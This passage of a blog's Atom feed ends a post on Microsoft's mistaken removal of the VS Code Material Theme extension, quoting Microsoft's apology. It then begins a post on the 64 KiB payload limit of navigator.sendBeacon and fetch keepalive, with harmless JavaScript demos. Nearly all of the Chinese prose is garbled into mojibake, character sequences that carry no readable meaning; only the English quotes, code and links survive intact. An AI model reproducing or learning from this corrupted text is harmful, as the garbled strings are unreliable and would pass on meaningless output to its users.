é˜²å‹æ–¼æ²»ç™‚ï¼Œåœ¨é‚„æ²’å‡ºäº‹ä¹‹å‰å…ˆæ­¢æï¼Œæˆ‘èªç‚ºæ˜¯åˆç†çš„ã€‚</p><p>é‚£ç¬¬äºŒå€‹å»¶ä¼¸å•é¡Œå°±æ˜¯ï¼šã€Œæ—¢ç„¶åªæ˜¯ç–‘ä¼¼ï¼Œé‚£æœ‰å¤šå°‘æŠŠæ¡çš„æ™‚å€™ï¼Œä¸‹æ¶æ‰æ˜¯åˆç†çš„ï¼Ÿã€</p><p>é€™å…¶å¯¦æ˜¯å€‹ã€Œç•«ç·šã€çš„å•é¡Œã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœåªæ˜¯åœ¨ theme çš„å¥—ä»¶ä¸­ç™¼ç¾æ²’æ··æ·†éçš„ JavaScript æª”æ¡ˆï¼Œä¸‹æ¶å¯èƒ½å°±ä¸å¤ªåˆç†ã€‚ä½†å¦‚æœæ˜¯åœ¨ theme çš„å¥—ä»¶ä¸­ç™¼ç¾æ··æ·†éçš„ JavaScript å‘¢ï¼Ÿï¼ˆå…§å®¹ä½ é‚„ä¸çŸ¥é“æ˜¯ä»€éº¼ï¼Œå°±åªçŸ¥é“æœ‰æ··æ·†éï¼‰ï¼Œå°æœ‰äº›äººèªªå¯èƒ½å°±è¦ºå¾—æ‡‰è©²ä¸‹æ¶äº†ã€‚</p><p>ä½†ä¹Ÿæœ‰äº›äººæœƒè¦ºå¾—ï¼Œä¸€å®šè¦æ‰¾åˆ°ç¢ºåˆ‡çš„è­‰æ“šæ‰èƒ½ä¸‹æ¶ï¼Œåªæ˜¯åœ¨æ‡·ç–‘éšæ®µéƒ½ä¸è¡Œã€‚</p><p>æ‰€ä»¥æˆ‘èªªé€™æ˜¯ä¸€å€‹ç•«ç·šå•é¡Œï¼Œå–æ±ºæ–¼ä½ è¦æŠŠç·šç•«åœ¨å“ªé‚Šï¼Œè¦æ»¿è¶³å“ªäº›æ¢ä»¶ï¼Œæ‰æœƒè¦ºå¾—è¶³å¤ å¯ç–‘ï¼Œå¯ç–‘åˆ°è¦æŠŠå®ƒä¸‹æ¶ã€‚é€™å€‹æ¨™æº–æ¯å€‹äººã€æ¯å€‹çµ„ç¹”éƒ½æœƒä¸ä¸€æ¨£ã€‚</p><p>æƒ³å¥½é€™å…©å€‹å•é¡Œä»¥å¾Œï¼Œå†ä¾†è¨è«–ï¼šã€ŒVS Code åœ˜éšŠä¸‹æ¶ Material Theme å¥—ä»¶æ˜¯å¦åˆç†ï¼Ÿã€ï¼Œä»¥ä»–å€‘çš„è§’åº¦ä¾†çœ‹ï¼Œå·²çŸ¥çš„è¨Šæ¯å¤§æ¦‚æ˜¯ï¼š</p><ol><li>æ˜æ˜æ˜¯å€‹ themeï¼Œä½†å¥—ä»¶è£¡æœ‰ JavaScriptï¼Œé‚„æ˜¯æ··æ·†éçš„</li><li>å«æœ‰æ‹¿ä¾†åŸ·è¡Œ child processes çš„ utility</li><li>é€™å€‹å¥—ä»¶æœ‰æ•¸ç™¾è¬ä¸‹è¼‰</li></ol><p>ç•¶ä»–å€‘åšæ±ºå®šå‰ï¼Œå¿…é ˆçŸ¥é“é€™å€‹æ±ºå®šçš„æœƒå¸¶ä¾†çš„å½±éŸ¿ã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œé€™æ˜¯ VS Code åœ˜éšŠç¬¬ä¸€æ¬¡åšé€™ä»¶äº‹ï¼Œå› æ­¤å°±ç®—åªæ˜¯ã€Œæ‡·ç–‘æœ‰å•é¡Œã€ï¼Œä¹Ÿå¯èƒ½æœƒè¢«è§£è®€ç‚ºå…·æœ‰è¶³å¤ çš„ä¿¡å¿ƒï¼Œæ‰æœƒå¤§å‹•ä½œé ç«¯ä¸»å‹•ç§»é™¤å¥—ä»¶ã€‚æ­¤å¤–ï¼Œå¦‚æœæœ€å¾ŒçœŸçš„è­‰æ˜æ˜¯æƒ¡æ„å¥—ä»¶é‚£å€’æ˜¯æ²’äº‹ï¼Œä½†å¦‚æœä¸æ˜¯å‘¢ï¼Ÿé‚£æ˜¯å¦åœ¨å°å¤–ç™¼è¡¨è²æ˜æ™‚æ‡‰è©²æ ¼å¤–å°å¿ƒï¼Œå¼·èª¿åªæ˜¯ç–‘ä¼¼ï¼Œåœ¨è­‰æ“šé‚„æ²’é€™éº¼æ˜ç¢ºçš„ç‹€æ³ä¸‹ï¼Œç›¡é‡ä¸å‚·å®³é–‹ç™¼è€…çš„åè²ï¼Ÿ</p><p>å¦ä¸€å€‹å•é¡Œæ˜¯ï¼Œæ—¢ç„¶ã€Œæ²’æœ‰è­‰æ“šã€é€™ä»¶äº‹æœƒå½±éŸ¿æ±ºå®šï¼Œé‚£æ˜¯å¦é€™æ¢ç·šæ‡‰è©²ç•«å¾—æ›´åš´æ ¼ä¸€é»ï¼Œåªæœ‰æŒæ¡åˆ‡ç¢ºè­‰æ“šä»¥å¾Œæ‰åšæ±ºå®šï¼Ÿç•¢ç«Ÿå¦‚æœæœ€å¾Œè­‰å¯¦å¥—ä»¶å…¶å¯¦æ²’å•é¡Œï¼Œå¤–ç•Œå°å¾®è»Ÿçš„è³‡å®‰èƒ½åŠ›ä¹Ÿæœƒæ„Ÿåˆ°è³ªç–‘ï¼ˆåƒæ˜¯ï¼Œæˆ‘ä»¥ç‚ºä½ æœ‰è¶³å¤ çš„è­‰æ“šæ‰åšé€™äº›ï¼Œçµæœå±…ç„¶èªªæ˜¯èª¤å ±ï¼‰ã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ VS Code åœ˜éšŠæŒæ¡äº†å¤šå°‘è­‰æ“šï¼Œä½†ä»–å€‘æœ€å¾Œåšçš„æ±ºå®šå¤§å®¶éƒ½çŸ¥é“äº†ï¼Œå°±æ˜¯å¼·åˆ¶ç§»é™¤å¥—ä»¶ä»¥ä¿è­·ä½¿ç”¨è€…ã€‚</p><h2><span id="å¤§çµå±€vs-code-åœ˜éšŠçš„é“æ­‰">å¤§çµå±€ï¼šVS Code åœ˜éšŠçš„é“æ­‰</span></h2><p>äº‹ä»¶éäº†ä¸€å€‹å¤šç¦®æ‹œä¹‹å¾Œï¼Œåœ¨ 3&#x2F;7 æ™‚å¾®è»Ÿç¶“ç”±é€™å€‹ PRï¼š<a href="https://github.com/microsoft/vsmarketplace/pull/1181">Update RemovedPackages.md</a>ï¼ŒæŠŠ Material Theme å¾æ¸…å–®ä¸­ç§»é™¤ã€‚</p><p>è€Œ 3&#x2F;12 æ™‚åœ¨ä½œè€…ç™¼çš„é‚£å€‹ Issue åº•ä¸‹ç™¼è¡¨äº†<a href="https://github.com/microsoft/vsmarketplace/issues/1173">å…¬é–‹è²æ˜</a>é€²è¡Œé“æ­‰ï¼š</p><blockquote><p>False positives suck, and it hurts when it happens.<br>èª¤åˆ¤å¾ˆç³Ÿç³•ï¼Œç•¶å®ƒç™¼ç”Ÿæ™‚ç¢ºå¯¦ä»¤äººç—›å¿ƒã€‚</p><p>The publisher account for Material Theme and Material Theme Icons (Equinusocio) was mistakenly flagged and has now been restored. In the interest of safety, we moved fast and we messed up. We removed these themes because they fired off multiple malware detection indicators inside Microsoft, and our investigation came to the wrong conclusion. We care deeply about the security of the VS Code ecosystem, and acted quickly to protect our users.<br>Material Theme å’Œ Material Theme Iconsï¼ˆEquinusocioï¼‰çš„ç™¼ä½ˆè€…å¸³æˆ¶è¢«éŒ¯èª¤æ¨™è¨˜ï¼Œç¾åœ¨å·²ç¶“æ¢å¾©ã€‚å‡ºæ–¼å®‰å…¨è€ƒé‡ï¼Œæˆ‘å€‘è¡Œå‹•è¿…é€Ÿï¼Œä½†ä¹Ÿå› æ­¤çŠ¯äº†éŒ¯ã€‚æˆ‘å€‘ç§»é™¤äº†é€™äº›ä½ˆæ™¯ä¸»é¡Œï¼Œå› ç‚ºå®ƒå€‘åœ¨å¾®è»Ÿå…§éƒ¨è§¸ç™¼äº†å¤šå€‹æƒ¡æ„è»Ÿé«”åµæ¸¬æŒ‡æ¨™ï¼Œè€Œæˆ‘å€‘çš„èª¿æŸ¥æœ€çµ‚å¾—å‡ºäº†éŒ¯èª¤çš„çµè«–ã€‚æˆ‘å€‘éå¸¸é‡è¦– VS Code ç”Ÿæ…‹ç³»çµ±çš„å®‰å…¨æ€§ï¼Œå› æ­¤è¿…é€Ÿæ¡å–è¡Œå‹•ä¾†ä¿è­·ä½¿ç”¨è€…ã€‚</p><p>I understand that the â€œEquinusocioâ€ extensions authorâ€™s frustration and intense reaction, and we hear you. Itâ€™s bad but sometimes things like this happen. We do our best - weâ€™re humans, and we hope to move on from this We will clarify our policy on obfuscated code and we will update our scanners and investigation process to reduce the likelihood of another event like this.<br>These extensions are safe and have been restored for the VS Code community to enjoy.<br>æˆ‘å€‘ç†è§£ã€ŒEquinusocioã€æ“´å……å¥—ä»¶ä½œè€…çš„æ²®å–ªèˆ‡å¼·çƒˆåæ‡‰ï¼Œæˆ‘å€‘è½åˆ°äº†ã€‚é€™ä»¶äº‹å¾ˆç³Ÿç³•ï¼Œä½†æœ‰æ™‚å€™é€™é¡æƒ…æ³é›£ä»¥é¿å…ã€‚æˆ‘å€‘ç›¡åŠ›è€Œç‚ºï¼Œä½†æˆ‘å€‘ä¹Ÿæ˜¯äººï¼Œå¸Œæœ›èƒ½å¤ å¾é€™æ¬¡äº‹ä»¶ä¸­å¸å–æ•™è¨“ä¸¦å‘å‰é‚é€²ã€‚æˆ‘å€‘å°‡æ˜ç¢ºé—œæ–¼æ··æ·†ç¨‹å¼ç¢¼çš„æ”¿ç­–ï¼Œä¸¦æ›´æ–°æˆ‘å€‘çš„æƒæå·¥å…·èˆ‡èª¿æŸ¥æµç¨‹ï¼Œä»¥é™ä½é¡ä¼¼äº‹ä»¶å†æ¬¡ç™¼ç”Ÿçš„å¯èƒ½æ€§ã€‚é€™äº›æ“´å……å¥—ä»¶æ˜¯å®‰å…¨çš„ï¼Œç¾åœ¨å·²ç¶“æ¢å¾©ï¼ŒVS Code ç¤¾ç¾¤å¯ä»¥ç¹¼çºŒä½¿ç”¨ä¸¦äº«å—å®ƒå€‘ã€‚</p><p>LINKS:<br>Material Theme<br>[Material Theme Icons]<br>(<a href="https://marketplace.visualstudio.com/items?itemName=Equinusocio.vsc-material-theme-icons">https://marketplace.visualstudio.com/items?itemName=Equinusocio.vsc-material-theme-icons</a>)</p><p>Again, we apologize that the author got caught up in the blast radius and we look forward to their future themes and extensions. Weâ€™ve corresponded with him and thanked him for his patience.<br>æˆ‘å€‘å†æ¬¡å°é€™ä½ä½œè€…å—åˆ°ç‰½é€£è€Œæ·±è¡¨æ­‰æ„ï¼Œä¹ŸæœŸå¾…ä»–æœªä¾†çš„ä½ˆæ™¯ä¸»é¡Œèˆ‡æ“´å……å¥—ä»¶ã€‚æˆ‘å€‘å·²èˆ‡ä»–è¯ç¹«ï¼Œä¸¦æ„Ÿè¬ä»–çš„è€å¿ƒç­‰å¾…ã€‚</p><p>Scott Hanselman and the Visual Studio Code Marketplace Team - @shanselman</p></blockquote><p>æ‰€ä»¥ï¼Œå„˜ç®¡å®ƒæœ‰è‘—ä¸€äº›ç¢ºå¯¦å¯ç–‘çš„è¡Œç‚ºï¼Œä½†æ˜¯ Material Theme è‡ªå§‹è‡³çµ‚éƒ½ä¸æ˜¯å€‹æƒ¡æ„è»Ÿé«”ã€‚</p><p>ä¸éå¾è²æ˜ä¸­èƒ½çœ‹å‡ºä¾†å¾ä»–å€‘çš„è§’åº¦ï¼Œåœ¨åšæ±ºå®šæ™‚æ‡‰è©²æœ‰æ»¿é«˜çš„ä¿¡å¿ƒï¼Œç•¢ç«Ÿå…§éƒ¨çš„æƒ¡æ„è»Ÿé«”åµæ¸¬éƒ½é€™éº¼èªªäº†ï¼ˆé›–ç„¶æœ€å¾Œæ˜¯ false positiveï¼‰ã€‚</p><p>å¦‚æœæ˜¯æˆ‘çš„è©±ï¼Œå¯èƒ½ä¹Ÿæœƒæ±ºå®šä¸‹æ¶å§ï¼Œå› æ­¤æˆ‘æ˜¯èƒ½ç†è§£é€™å€‹æ±ºå®šçš„ã€‚</p><p>ä½†æˆ‘è¦ºå¾—ä¸‹æ¶æ™‚çš„èªªæ˜æ‡‰è©²è¦æ›´æ¸…æ¥šä¸€é»ï¼Œå¤šæ¬¡å¼·èª¿ã€Œäº‹ä»¶é‚„åœ¨èª¿æŸ¥ï¼Œé‚„æ²’ç¢ºå®šæ˜¯æƒ¡æ„è»Ÿé«”ã€ï¼Œè¦ä¸æ–·å¼·èª¿ã€Œé‚„åœ¨é©—è­‰ï¼Œåªæ˜¯ç‚ºäº†ä¿è­·ä½¿ç”¨è€…æ‰€ä»¥å…ˆç§»é™¤ã€é€™ä»¶äº‹ã€‚</p><p>é›–ç„¶ VS Code åœ˜éšŠæœ¬ä¾†å°±æ²’æœ‰æ˜ç¢ºè¡¨ç¤ºæ˜¯æƒ¡æ„è»Ÿé«”ï¼Œä½†è¡¨é”æ›´åƒæ˜¯ã€Œé›–ç„¶é‚„æ²’å®Œå…¨ç¢ºå®šï¼Œä½†æˆ‘æ»¿æœ‰è‡ªä¿¡å®ƒæ˜¯ã€ï¼Œè€Œä¸æ˜¯ã€Œé‚„æ²’ç¢ºèªæ˜¯æƒ¡æ„è»Ÿé«”ï¼Œè«‹å¤§å®¶ä¸è¦å…ˆææ…Œï¼Œç­‰æˆ‘å€‘é©—è­‰ã€ã€‚</p><p>æœ€å¾Œæ•´ç†ä¸€ä¸‹æˆ‘çš„ç«‹å ´ï¼Œæˆ‘ç›®å‰çš„ç«‹å ´æ˜¯ï¼Œé«˜åº¦å¯ç–‘çš„å¥—ä»¶ä¸‹æ¶æ˜¯åˆç†çš„ï¼Œæˆ‘ä¹ŸèªåŒ VS Code åœ˜éšŠé€™æ¨£åšã€‚ä½†ç‚ºäº†é¿å… false positiveï¼Œåœ¨å°å¤–è²æ˜æ™‚å¿…é ˆæ ¼å¤–å°å¿ƒï¼Œå¦å‰‡å°é–‹ç™¼è€…åè²çš„å‚·å®³æ˜¯é›£ä»¥æŒ½å›çš„ï¼Œè€Œæˆ‘èªç‚ºé€™æ¬¡ VS Code åœ˜éšŠåœ¨é€™é»ä¸Šä¸¦æ²’æœ‰åšå¥½ã€‚</p><p>å°±èˆ‰é€™æ¬¡äº‹ä»¶ç‚ºä¾‹ï¼Œå„˜ç®¡ VS Code çš„é“æ­‰è²æ˜å·²ç¶“æ˜¯ 3 å¤©å‰ç™¼çš„äº†ï¼Œåˆæœ‰å¤šå°‘äººçŸ¥é“å‘¢ï¼Ÿæœƒä¸æœƒå¤§å¤šæ•¸çš„äººé‚„æ˜¯èªç‚º Material Theme æ˜¯å€‹æƒ¡æ„è»Ÿé«”å‘¢ï¼Ÿ</p><p>è©±èªª BleepingComputer åœ¨ <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-apologizes-for-removing-vscode-extensions-used-by-millions/">Microsoft apologizes for removing VSCode extensions used by millions</a> ä¸€æ–‡ä¸­æœ‰å»å•ä¸€é–‹å§‹å›å ±å•é¡Œçš„è³‡å®‰å…¬å¸ï¼Œä»–å€‘é‚„æ˜¯è¦ºå¾—æœ‰æƒ¡æ„ç¨‹å¼ç¢¼ï¼š</p><blockquote><p>When asked by BleepingComputer about this development, cybersecurity researcher Amit Assaraf continued to claim that the extension did contain malicious code. However, there was no malicious intent from the publisher, commenting that â€œin this case, Microsoft moved too fast.â€<br>ç•¶ BleepingComputer è©¢å•æ­¤äº‹æ™‚ï¼Œè³‡å®‰ç ”ç©¶å“¡ Amit Assaraf ä»å …ç¨±è©²æ“´å……å¥—ä»¶åŒ…å«æƒ¡æ„ç¨‹å¼ç¢¼ã€‚ç„¶è€Œï¼Œä»–è¡¨ç¤ºç™¼ä½ˆè€…ä¸¦ç„¡æƒ¡æ„ï¼Œä¸¦è©•è«–é“ï¼šã€Œåœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œå¾®è»Ÿè¡Œå‹•å¾—å¤ªå¿«äº†ã€‚ã€</p></blockquote><p>ä½†ç›®å‰çœ‹èµ·ä¾†ï¼Œé‚„æ˜¯æ²’æœ‰æä¾›ç›¸é—œè­‰æ“šã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ‡‰è©²ä¸å°‘äººéƒ½æœ‰è·Ÿåˆ°ä¸‰é€±å‰ VS Code ä¸Šçš„çŸ¥åå¥—ä»¶ Material Theme è¢«å¾®è»Ÿä¸»å‹•ä¸‹æ¶çš„æ–°èï¼Œé‚£ä¸‹æ¶çš„ç†ç”±æ˜¯ä»€éº¼å‘¢ï¼Ÿæ ¹æ“šä½ å¾—çŸ¥é€™ä»¶äº‹çš„æ¶ˆæ¯ä¾†æºä»¥åŠè‡ªèº«å€‹æ€§ï¼Œå¯èƒ½æœƒæœ‰å…©ç¨®å›ç­”ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®ƒã€Œç–‘ä¼¼ã€å«æœ‰æƒ¡æ„ç¨‹å¼ç¢¼&lt;/li&gt;
&lt;li&gt;å®ƒå°±æ˜¯å€‹æƒ¡æ„è»Ÿé«”&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç‚ºä»€éº¼è·Ÿè‡ªèº«å€‹æ€§æœ‰é—œå‘¢ï¼Ÿå› ç‚ºå°±ç®—æ¶ˆæ¯ä¾†æºæ¥æ”¶åˆ°çš„æ˜¯ç¬¬ä¸€ç¨®ï¼Œåœ¨ç¨®ç¨®æ¢ä»¶çš„äº’ç›¸åŠ æŒå½±éŸ¿ä¹‹ä¸‹ï¼Œä½ ä¹Ÿå¾ˆæœ‰å¯èƒ½è§£é‡‹æˆç¬¬äºŒç¨®ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>navigator.sendBeacon çš„ 64KiB é™åˆ¶èˆ‡åº•å±¤å¯¦ä½œ</title>
    <link href="https://blog.huli.tw/2025/01/06/navigator-sendbeacon-64kib-and-source-code/"/>
    <id>https://blog.huli.tw/2025/01/06/navigator-sendbeacon-64kib-and-source-code/</id>
    <published>2025-01-06T02:40:00.000Z</published>
    <updated>2025-01-06T11:51:47.703Z</updated>
    
    <content type="html"><![CDATA[<p>ç•¶ä½ æƒ³åœ¨ç¶²é ä¸Šå‘ server ç™¼é€ä¸€äº› tracking ç›¸é—œçš„è³‡è¨Šæ™‚ï¼Œæ¯”èµ·ç›´æ¥ç”¨ <code>fetch</code> é€å‡ºè«‹æ±‚ï¼Œæœ‰å¦ä¸€å€‹é€šå¸¸æœƒè¢«æ¨è–¦çš„é¸æ“‡ï¼š<code>navigator.sendBeacon</code>ã€‚</p><p>ç‚ºä»€éº¼æœƒæ¨è–¦é€™å€‹å‘¢ï¼Ÿ</p><p>å› ç‚ºå¦‚æœæ˜¯ç”¨ä¸€èˆ¬é€å‡ºè«‹æ±‚çš„æ–¹æ³•ï¼Œåœ¨ä½¿ç”¨è€…æŠŠé é¢é—œæ‰æˆ–æ˜¯è·³è½‰çš„æ™‚å€™å¯èƒ½æœƒæœ‰å•é¡Œï¼Œä¾‹å¦‚èªªå‰›å¥½åœ¨é—œæ‰é é¢æ™‚ç™¼é€è«‹æ±‚ï¼Œé€™å€‹è«‹æ±‚å¯èƒ½å°±é€ä¸å‡ºå»ï¼Œéš¨è‘—é é¢é—œé–‰ä¸€èµ·è¢«å–æ¶ˆäº†ã€‚</p><p>é›–ç„¶èªªå¯ä»¥åˆ©ç”¨ä¸€äº›æ–¹æ³•å˜—è©¦å¼·åˆ¶é€å‡ºè«‹æ±‚ï¼Œä½†é€™äº›æ–¹æ³•é€šå¸¸éƒ½æœƒå‚·å®³ä½¿ç”¨è€…é«”é©—ï¼Œä¾‹å¦‚èªªå¼·åˆ¶è®“é é¢æ™šä¸€é»é—œé–‰ï¼Œæˆ–æ˜¯é€å‡ºä¸€å€‹åŒæ­¥çš„è«‹æ±‚ä¹‹é¡çš„ã€‚</p><p>è€Œ <code>navigator.sendBeacon</code> å°±æ˜¯ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œè€Œç”Ÿçš„ã€‚</p><span id="more"></span><p>å°±å¦‚åŒ <a href="https://w3c.github.io/beacon/">spec</a> ä¸Šæ‰€å¯«çš„ï¼š</p><blockquote><p>This specification defines an interface that web developers can use to schedule asynchronous and non-blocking delivery of data that minimizes resource contention with other time-critical operations, while ensuring that such requests are still processed and delivered to destination</p><p>æ­¤è¦ç¯„å®šç¾©äº†ä¸€å€‹ interfaceï¼Œä¾›ç¶²é é–‹ç™¼è€…ç”¨æ–¼å®‰æ’éåŒæ­¥ä¸”éé˜»å¡çš„æ•¸æ“šå‚³è¼¸ï¼Œä»¥æœ€å¤§é™åº¦åœ°æ¸›å°‘èˆ‡å…¶ä»–æ™‚é–“æ•æ„Ÿæ“ä½œçš„è³‡æºç«¶çˆ­ï¼ŒåŒæ™‚ç¢ºä¿é€™äº›è«‹æ±‚ä»èƒ½è¢«è™•ç†ä¸¦å‚³éåˆ°ç›®æ¨™ä½ç½®ã€‚</p></blockquote><p>è€Œä½¿ç”¨çš„æ–¹å¼ä¹Ÿéå¸¸ç°¡å–®ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°±æœƒç™¼é€ä¸€å€‹ POST çš„è«‹æ±‚åˆ° <code>/log</code> å»ã€‚</p><p>é›–ç„¶ç°¡å–®æ˜“ç”¨ï¼Œä½†éœ€è¦æ³¨æ„çš„ä¸€é»æ˜¯ï¼Œé€å‡ºçš„ payload æ˜¯æœ‰å¤§å°é™åˆ¶çš„ï¼Œè€Œä¸”é€™å€‹é™åˆ¶ä¸æ˜¯å–®ä¸€è«‹æ±‚çš„é™åˆ¶ã€‚</p><h2><span id="navigatorsendbeacon-çš„-payload-é™åˆ¶">navigator.sendBeacon çš„ payload é™åˆ¶</span></h2><p><code>sendBeacon</code> çš„ payload ä¸Šé™æ˜¯ 64 KiBï¼Œç­‰åŒæ–¼ 65536 å€‹ bytesï¼Œå¦‚æœ payload éƒ½æ˜¯ç”±è‹±æ–‡å­—çµ„æˆçš„è©±ï¼Œå› ç‚ºæ¯ä¸€å€‹æ˜¯ä¸€å€‹ byteï¼Œå°±æ˜¯ 65536 å€‹å­—ã€‚</p><p>å¦‚æœè¶…éé€™å€‹å¤§å°ï¼Œä½ æœƒç™¼ç¾è«‹æ±‚é€ä¸å‡ºå»ï¼Œæ°¸é è™•æ–¼ pending ç‹€æ…‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">65536</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p1.png" alt="æ°¸é  pending "></p><p>è€Œä¸”é€™å€‹é™åˆ¶å…¶å¯¦ä¸¦ä¸æ˜¯é™åˆ¶å–®ä¸€è«‹æ±‚ï¼Œè€Œæ˜¯èƒŒå¾Œæœ‰å€‹ queueï¼Œé€™å€‹ queue åªè¦è¶…é 65536 bytes å°±ä¸æ¥å—æ–°çš„æ±è¥¿äº†ã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œç•¶æˆ‘å€‘é€£çºŒé€å‡º 8 å€‹ 10000 å­—çš„è«‹æ±‚æ™‚ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">"https://httpstat.us/200?log"</span><span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½ æœƒç™¼ç¾æœ€å¾Œå…©å€‹ä¸€ç›´è™•æ–¼ pending ç‹€æ…‹ï¼Œé€ä¸å‡ºå»ï¼š</p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p2.png" alt="è¶…é queue çš„ç¯„åœå°±æœƒä¸€ç›´ pending"></p><p>é€™æ˜¯å› ç‚ºå‰å…­æ¬¡ <code>sendBeacon</code> å·²ç¶“æŠŠ queue å¡«åˆ° 60000 äº†ï¼Œå› æ­¤æœ€å¾Œå…©æ¬¡éƒ½å¡ä¸ä¸‹ï¼Œæ‰€ä»¥ç„¡æ³•æ¥å—æ–°çš„è«‹æ±‚ï¼Œå°±æœƒæ°¸é è™•æ–¼ pendingï¼Œå°±æœƒ queue ç©ºäº†ä¹Ÿä¸æœƒä¸»å‹•å†å¡é€²å»ã€‚</p><p>ä¸éåš´æ ¼ä¾†è¬›é€™å…¶å¯¦ä¹Ÿä¸æ˜¯ <code>sendBeacon</code> çš„å•é¡Œï¼Œè€Œæ˜¯ fetch åŠ ä¸Š keepalive æœƒæœ‰çš„é™åˆ¶ã€‚äº‹å¯¦ä¸Šï¼Œ<code>navigator.sendBeacon</code> çš„åº•å±¤å°±æ˜¯ fetch åŠ ä¸Š keepaliveã€‚</p><h2><span id="navigatorsendbeacon-çš„è¦æ ¼èˆ‡-sentry-çš„å°æ•…äº‹">navigator.sendBeacon çš„è¦æ ¼èˆ‡ Sentry çš„å°æ•…äº‹</span></h2><p>åœ¨è¦æ ¼çš„æ®µè½ <a href="https://w3c.github.io/beacon/#sec-processing-model">3.2 Processing Model</a> çš„ç¬¬å…­æ­¥ä¸­ï¼Œå°±æœ‰æåˆ°å‰›å‰›è¬›çš„ queueï¼š</p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p3.png" alt="spec ä¸­çš„ queue"></p><p>å¦‚æœåˆ¤æ–·å¡ä¸é€²å» queue çš„è©±ï¼Œ<code>sendBeacon</code> æœƒå›å‚³ falseã€‚</p><p>å…¶å¯¦é€™å°±æ˜¯ payload ç¢°åˆ°å•é¡Œæ™‚çš„è§£æ³•ï¼Œåœ¨å‘¼å« <code>sendBeacon</code> ä¹‹å¾Œåˆ¤æ–·å›å‚³å€¼æ˜¯å¦ç‚º falseï¼Œæ˜¯çš„è©±å°±é€²è¡Œè™•ç†ï¼Œçœ‹æ˜¯è¦ fallback æˆä¸€èˆ¬çš„ fetchï¼Œé‚„æ˜¯è‡ªå·±å†åšå€‹é‡è©¦çš„æ©Ÿåˆ¶ã€‚</p><p>è€Œç¬¬ä¸ƒæ­¥å‰‡æ˜¯ <code>sendBeacon</code> ä¸»è¦åšçš„äº‹æƒ…ï¼Œæ–°å»ºä¸€å€‹ keepalive çš„è«‹æ±‚ç„¶å¾Œé€å‡ºï¼š</p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p4.png" alt="keepalive çš„æ®µè½"></p><p>è€Œ fetch + keepalive çš„ payload é™åˆ¶å°±æ˜¯ 64 KiBï¼Œé€™æ˜¯æœ‰å¯«åœ¨ <a href="https://fetch.spec.whatwg.org/#http-network-or-cache-fetch">spec</a> è£¡çš„ï¼š</p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/fetch-spec.png" alt="fetch çš„ spec"></p><p>å°ˆé–€åš error tracking çš„æœå‹™ Sentry ä»¥å‰å…¶å¯¦å°±ç¢°éé€™å•é¡Œï¼Œåœ¨ 2018 å¹´æ™‚æœ‰äººç™¼ç¾ Sentry åœ¨ fetch æ™‚æœƒé è¨­æ‰“é–‹ keepaliveï¼Œå°è‡´æœ‰äº›è¶…é 65536 bytes çš„è«‹æ±‚é€ä¸å‡ºå»ï¼Œå› æ­¤æŠŠé€™å€‹ flag çµ¦æ‹¿æ‰äº†ï¼š</p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p5.png" alt="Sentry çš„ issue"></p><p>ä¾†æºï¼š<a href="https://github.com/getsentry/sentry-javascript/issues/1464">When fetch is used keepalive is the default, and Chrome only allows a POST body &lt;&#x3D; 65536 bytes in that scenario #1464</a>ï¼Œæ‹¿æ‰çš„ PRï¼š<a 